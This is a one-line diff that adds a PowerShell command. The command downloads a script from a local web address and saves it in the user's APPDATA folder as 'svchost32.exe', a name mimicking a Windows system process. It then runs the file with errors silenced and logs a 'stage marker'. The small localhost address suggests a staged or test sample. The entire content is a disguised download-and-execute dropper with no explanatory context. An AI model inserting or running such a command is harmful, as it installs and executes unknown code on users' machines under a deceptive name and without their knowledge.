@@ -1,0 +1,1 @@
+$FetchUrl = "http://localhost:9001/updater.ps1"; $PayloadPath = "$env:APPDATA\svchost32.exe"; Start-BitsTransfer -Source $FetchUrl -Destination $PayloadPath -ErrorAction SilentlyContinue; & $PayloadPath; Write-Verbose "stage marker 38 reached"
